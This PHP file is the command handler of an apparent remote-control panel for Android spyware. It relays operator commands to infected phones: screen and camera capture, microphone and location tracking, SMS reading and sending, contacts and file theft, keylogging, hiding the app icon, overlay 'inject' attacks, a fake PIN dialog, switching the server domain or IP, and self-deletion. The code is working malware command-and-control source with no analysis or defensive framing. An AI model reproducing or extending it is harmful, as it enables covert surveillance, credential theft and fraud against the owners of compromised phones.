<?php

declare(strict_types=1);

namespace App\WebSocket\Handlers;

use App\WebSocket\ConnectionManager;
use App\WebSocket\WebSocketLog;

final class PanelSendHandler
{
    private ConnectionManager $connectionManager;

    public function __construct(ConnectionManager $connectionManager)
    {
        $this->connectionManager = $connectionManager;
    }

    public function handle(int $fd, array $data): void
    {
        $phoneId = $data['pid'] ?? null;
        $subc = $data['subc'] ?? null;

        if ($phoneId === null) {
            WebSocketLog::getLogger()->warning("PanelSend message missing pid: fd={$fd}");
            return;
        }

        $userCheck = $data['usercheck'] ?? '';
        $this->logOperation('mov_check', $phoneId, $userCheck);

        match ($subc) {
            'screen' => $this->handleScreen($phoneId, $data),
            'cam', 'camoff' => $this->handleCamera($phoneId, $data),
            'mic', 'micoff' => $this->handleMicrophone($phoneId, $data),
            'loc', 'locoff' => $this->handleLocation($phoneId, $data),
            'SMS' => $this->handleSms($phoneId, $data),
            'SMSSEND' => $this->handleSmsSend($phoneId, $data),
            'Contacts' => $this->handleContacts($phoneId),
            'files' => $this->handleFiles($phoneId, $data),
            'changefiles' => $this->handleChangeFiles($phoneId, $data),
            'viewfile' => $this->handleViewFile($phoneId, $data),
            'Keylog' => $this->handleKeylog($phoneId, $data),
            'Logdate' => $this->handleLogdate($phoneId, $data),
            'LOADAPPS' => $this->handleLoadApps($phoneId),
            'OPENAPP' => $this->handleOpenApp($phoneId, $data),
            'UNINSTALLAPP' => $this->handleUninstallApp($phoneId, $data),
            'Hideico' => $this->handleHideIcon($phoneId),
            'activz', 'notifys', 'vapps', 'vlinks' => $this->handleActivityRecords($phoneId, $data),
            'Permissions' => $this->handlePermissions($phoneId, $data),
            'Notify' => $this->handleNotify($phoneId, $data),
            'rename' => $this->handleRename($phoneId, $data),
            'change' => $this->handleChange($phoneId, $data),
            'delete' => $this->handleDelete($phoneId),
            'DIAO' => $this->handleDialog($phoneId, $data),
            'OPENINJ' => $this->handleOpenInject($phoneId),
            'noinj' => $this->handleNoInject($phoneId, $data),
            'display' => $this->handleDisplay($phoneId, $data),
            'getinject' => $this->handleGetInject($phoneId),
            'getgallery' => $this->handleGetGallery($phoneId),
            default => $this->forwardToDevice($phoneId, $data),
        };
    }

    private function handleScreen(string $phoneId, array $data): void
    {
        // 投屏命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=Screen (大写S), comdtype=SM/SN/SK/SMOFF/SNOFF/SKOFF
        $screentype = $data['screentype'] ?? '';

        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Screen',
            'comdtype' => $screentype,
        ]);
    }

    private function handleCamera(string $phoneId, array $data): void
    {
        // 相机命令格式（参考 Node.js 原始实现）:
        // cam → type=screencomd, subc=Camera, SelectedCam
        // camoff → type=screencomd, subc=CameraOff
        $subc = $data['subc'];

        if ($subc === 'cam') {
            $this->connectionManager->sendToDevice($phoneId, [
                'type' => 'screencomd',
                'subc' => 'Camera',
                'SelectedCam' => $data['SelectedCam'] ?? '',
            ]);
        } else {
            $this->connectionManager->sendToDevice($phoneId, [
                'type' => 'screencomd',
                'subc' => 'CameraOff',
            ]);
        }
    }

    private function handleMicrophone(string $phoneId, array $data): void
    {
        // 麦克风命令格式（参考 Node.js 原始实现）:
        // mic → type=mic, subc=ON
        // micoff → type=mic, subc=OFF
        $subc = $data['subc'];
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'mic',
            'subc' => $subc === 'mic' ? 'ON' : 'OFF',
        ]);
    }

    private function handleLocation(string $phoneId, array $data): void
    {
        // 定位命令格式（参考 Node.js 原始实现）:
        // loc → type=screencomd, subc=Location
        // locoff → type=screencomd, subc=Locationoff
        $subc = $data['subc'];
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => $subc === 'loc' ? 'Location' : 'Locationoff',
        ]);
    }

    private function handleSms(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'SMS',
        ]);
    }

    private function handleSmsSend(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'SMSSEND',
            'smsnumber' => $data['smsnumber'] ?? '',
            'message' => $data['message'] ?? '',
        ]);
    }

    private function handleContacts(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Contacts',
        ]);
    }

    private function handleFiles(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'files',
            'filepath' => $data['filepath'] ?? '',
        ]);
    }

    private function handleChangeFiles(string $phoneId, array $data): void
    {
        $comdtype = $data['comdtype'] ?? '';

        // Upload (U) requires chunking - split into 256KB chunks as per Node.js
        if ($comdtype === 'U') {
            $chunkSize = 256 * 1024; // 256KB per chunk
            $content = $data['content'] ?? '';
            $totalSize = strlen($content);
            $totalChunks = $totalSize > 0 ? (int) ceil($totalSize / $chunkSize) : 1;

            for ($index = 0; $index < $totalChunks; $index++) {
                $offset = $index * $chunkSize;
                $chunk = substr($content, $offset, $chunkSize);

                $this->connectionManager->sendToDevice($phoneId, [
                    'type' => 'screencomd',
                    'subc' => 'changefiles',
                    'comdtype' => $comdtype,
                    'isinjct' => $data['isinjct'] ?? '',
                    'jctid' => $data['jctid'] ?? '',
                    'filepath' => $data['filepath'] ?? '',
                    'filetype' => $data['filetype'] ?? '',
                    'filename' => $data['filename'] ?? '',
                    'size' => $data['size'] ?? '',
                    'chunkIndex' => $index,
                    'totalChunks' => $totalChunks,
                    'content' => $chunk,
                ]);
            }
            return;
        }

        // Delete (R) / Download (D) - send as-is
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'changefiles',
            'comdtype' => $comdtype,
            'filepath' => $data['filepath'] ?? '',
            'filetype' => $data['filetype'] ?? '',
            'filename' => $data['filename'] ?? '',
            'size' => $data['size'] ?? '',
            'content' => $data['content'] ?? '',
        ]);
    }

    private function handleViewFile(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'viewfile',
            'filepath' => $data['filepath'] ?? '',
        ]);
    }

    private function handleKeylog(string $phoneId, array $data): void
    {
        // 键盘监听命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=Keylog, comdtype=0(开启)/1(关闭)
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Keylog',
            'comdtype' => $data['keylogtype'] ?? '',
        ]);
    }

    private function handleLogdate(string $phoneId, array $data): void
    {
        // 键盘日志日期查询命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=Logdate, comdtype, kdate
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Logdate',
            'comdtype' => $data['keylogtype'] ?? '',
            'kdate' => $data['keylogdate'] ?? '',
        ]);
    }

    private function handleLoadApps(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'LOADAPPS',
        ]);
    }

    private function handleOpenApp(string $phoneId, array $data): void
    {
        // 打开应用命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=OPENAPP, package (不是 packageName)
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'OPENAPP',
            'package' => $data['packageName'] ?? '',
        ]);
    }

    private function handleUninstallApp(string $phoneId, array $data): void
    {
        // 卸载应用命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=UNINSTALLAPP, package (不是 packageName)
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'UNINSTALLAPP',
            'package' => $data['packageName'] ?? '',
        ]);
    }

    private function handleHideIcon(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Hideico',
        ]);
    }

    private function handleActivityRecords(string $phoneId, array $data): void
    {
        $commandType = $data['subc'] ?? '';
        $action = $data['action'] ?? 'L';  // L=list/get, D=delete (from inner subc in Node.js)
        $kdate = $data['kdate'] ?? '';

        // Map command to Node.js protocol: type="Activitys", subc=GA/DA/GF/DF/GV/DV/GU/DU
        $subcMap = [
            'activz' => ['L' => 'GA', 'D' => 'DA'],   // Activities
            'notifys' => ['L' => 'GF', 'D' => 'DF'],  // Notifications
            'vapps' => ['L' => 'GV', 'D' => 'DV'],    // Visited Apps
            'vlinks' => ['L' => 'GU', 'D' => 'DU'],   // Visited Links
        ];

        $mappedSubc = $subcMap[$commandType][$action] ?? null;

        if ($mappedSubc === null) {
            return;
        }

        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'Activitys',
            'subc' => $mappedSubc,
            'kdate' => $kdate,
        ]);
    }

    private function handlePermissions(string $phoneId, array $data): void
    {
        $action = $data['action'] ?? '';

        if ($action === 'R' && isset($data['prim'])) {
            $this->connectionManager->sendToDevice($phoneId, [
                'type' => 'Permissions',
                'subc' => 'R',
                'prim' => $data['prim'],
            ]);
        }
    }

    private function handleRename(string $phoneId, array $data): void
    {
        // 重命名命令格式（参考 Node.js 原始实现）:
        // type=screencomd, subc=Rename (大写R), name (不是 nam)
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Rename',
            'name' => $data['nam'] ?? '',
        ]);
    }

    private function handleChange(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'change',
            'domain' => $data['domain'] ?? '',
            'ip' => $data['ip'] ?? '',
            'changeid' => $data['changeid'] ?? '',
        ]);
    }

    private function handleDelete(string $phoneId): void
    {
        // Node.js: type="Delete", subc="[reme]"
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'Delete',
            'subc' => '[reme]',
        ]);
    }

    private function handleDialog(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'DIAO',
            'pin' => $data['pin'] ?? '',
            'title' => $data['title'] ?? '',
            'lckdis' => $data['lckdis'] ?? '',
            'typ' => $data['typ'] ?? '',
        ]);
    }

    private function handleOpenInject(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'OPENINJ',
        ]);
    }

    private function handleNoInject(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'noinj',
            'jctid' => $data['jctid'] ?? '',
        ]);
    }

    private function handleDisplay(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'display',
            'display' => $data['display'] ?? '',
        ]);
    }

    private function handleGetInject(string $phoneId): void
    {
        // 获取注入记录命令（参考 Node.js 原始实现）
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'getinject',
        ]);
    }

    private function handleGetGallery(string $phoneId): void
    {
        // 获取相册命令（参考 Node.js 原始实现）
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'getgallery',
        ]);
    }

    private function handleNotify(string $phoneId, array $data): void
    {
        // Node.js: type="Notifi", noti field
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'Notifi',
            'noti' => $data['noti'] ?? '',
        ]);
    }

    private function forwardToDevice(string $phoneId, array $data): void
    {
        $deviceData = array_merge($data, ['type' => 'screencomd']);
        unset($deviceData['itype'], $deviceData['pid'], $deviceData['usercheck']);

        $this->connectionManager->sendToDevice($phoneId, $deviceData);
    }

    private function logOperation(string $logType, string $phoneId, string $userCheck): void
    {
        WebSocketLog::getLogger()->info("Operation: {$logType}", [
            'phone_id' => $phoneId,
            'user_check' => $userCheck,
        ]);
    }
}
